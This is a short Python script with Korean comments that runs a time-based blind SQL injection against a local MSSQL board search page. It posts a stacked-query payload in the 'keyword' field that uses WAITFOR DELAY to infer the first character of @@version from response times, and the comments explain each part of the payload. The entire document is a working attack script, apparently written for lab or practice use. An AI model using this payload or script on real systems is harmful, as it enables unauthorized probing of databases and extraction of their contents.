import requests
import time

def time_based_sql_injection(url, search_type, parameter, payload):
    # SQL 인젝션 페이로드를 포함한 요청 시간 측정
    start_time = time.time()  # 시작 시간 기록

    # POST 요청에 사용될 데이터 준비
    data = {parameter: payload, 'search_type': search_type}

    # POST 요청 보내기
    response = requests.post(url, data=data)

    # 요청 완료 시간 계산
    injection_time = time.time() - start_time
    print(f"인젝션 요청 시간: {injection_time:.2f}초")

    return injection_time  # 총 소요 시간 반환


url = "http://localhost/board/mssql/index.php"  # 대상 URL
search_type = "all"  # 검색 유형
parameter = "keyword"  # SQL 인젝션을 시도할 파라미터
payload = "'; IF (64<=ascii(substring(@@version,1,1)) and ascii(substring(@@version,1,1)) <=95) WAITFOR DELAY '00:00:02'; IF (96<=ascii(substring(@@version,1,1)) and ascii(substring(@@version,1,1)) <=126)  WAITFOR DELAY '00:00:04' --"
# SQL 인젝션 페이로드:
# 1. 정상 쿼리를 종료하고 새 쿼리 시작 (';)
# 2. @@version의 첫 문자 ASCII 값을 확인
# 3. 64-95 사이면 2초 대기, 96-126 사이면 4초 대기
# 4. 주석 처리로 뒤의 SQL 무시 (--)

# 함수 실행 및 결과 출력
response_time = time_based_sql_injection(url, search_type, parameter, payload)
print(f"\n총 응답 시간: {response_time:.2f}초")
